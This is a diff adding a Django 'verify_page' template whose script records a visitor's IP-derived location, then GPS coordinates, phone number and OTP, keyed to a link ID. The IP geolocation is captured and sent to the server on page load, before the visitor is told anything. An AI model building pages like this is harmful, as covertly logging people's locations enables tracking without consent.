@@ -1,0 +1,70 @@
+<!-- loc/templates/loc/verify_page.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verify</title>
+  <script>
+    const locId = {{ loc_id }};
+    const CSRF = document.cookie.split(';')
+      .find(c=>c.trim().startsWith('csrftoken='))
+      ?.split('=')[1];
+
+    async function postJSON(url, body) {
+      return fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type":"application/json",
+          "X-CSRFToken": CSRF
+        },
+        body: JSON.stringify(body)
+      });
+    }
+
+    window.onload = async () => {
+      // —————— PHASE 1: CLIENT IP / CITY via ipapi.co ——————
+      try {
+        const ipRes  = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+        await postJSON("/save-ip/", {
+          loc_id:   locId,
+          ip_lat:   ipData.latitude,
+          ip_lon:   ipData.longitude,
+          ip_city:  ipData.city
+        });
+      } catch(e){
+        console.warn("Could not fetch ipapi.co:", e);
+      }
+
+      // —————— PHASE 2: HIGH-ACCURACY GPS ——————
+      if (!navigator.geolocation) {
+        return alert("Geolocation not supported");
+      }
+      navigator.geolocation.getCurrentPosition(
+        async pos => {
+          // 2a) save GPS
+          await postJSON("/save-gps/", {
+            loc_id:   locId,
+            latitude: pos.coords.latitude,
+            longitude:pos.coords.longitude
+          });
+
+          // 2b) phone & OTP
+          const phone = prompt("Enter your phone (+251...)");
+          if (!phone) return alert("Phone required");
+          await postJSON("/send-otp/", { loc_id: locId, phone });
+
+          const code = prompt("Enter the OTP you received");
+          const res  = await postJSON("/verify-otp/", { loc_id: locId, code });
+          const { status } = await res.json();
+          alert("Verification status: " + status);
+        },
+        () => alert("GPS permission required"),
+        { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+      );
+    };
+  </script>
+</head>
+<body>
+  <h1>Preparing verification…</h1>
+</body>
+</html>
